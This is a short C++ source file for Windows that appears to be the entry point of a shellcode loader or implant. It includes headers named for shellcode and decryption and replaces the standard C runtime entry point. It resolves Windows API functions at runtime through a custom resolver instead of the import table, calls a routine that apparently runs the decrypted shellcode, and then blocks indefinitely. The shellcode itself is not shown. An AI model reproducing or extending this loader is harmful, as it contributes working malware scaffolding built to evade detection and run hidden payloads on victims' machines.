#include <Nax.h>
#include <Shellcode.h>
#include <Decrypt.h>

static VOID Runner( VOID ) {
    if ( ShellRun() ) {
        DWORD ( WINAPI *NaxWait )( HANDLE, DWORD ) =
            ( DWORD ( WINAPI* )( HANDLE, DWORD ) ) NaxApi( "WaitForSingleObject" );
        if ( NaxWait )
            NaxWait( (HANDLE)-1, INFINITE );
        for ( ;; ) ;   /* resolver failed - never return to a dead entry */
    }
}

auto WINAPI WinMain(
    _In_ HINSTANCE Instance,
    _In_ HINSTANCE PrevInstance,
    _In_ CHAR*     CommandLine,
    _In_ INT32     ShowCmd
) -> INT32 {
    Runner();
    return 0;
}

extern "C" VOID WinMainCRTStartup( VOID ) {
    VOID ( WINAPI *NaxExit )( UINT ) = ( VOID ( WINAPI* )( UINT ) ) NaxApi( "ExitProcess" );
    INT32 ret = WinMain( NULL, NULL, NULL, 0 );
    if ( NaxExit )
        NaxExit( (UINT)ret );
    for ( ;; ) ;   /* resolver failed - never return to a dead entry */
}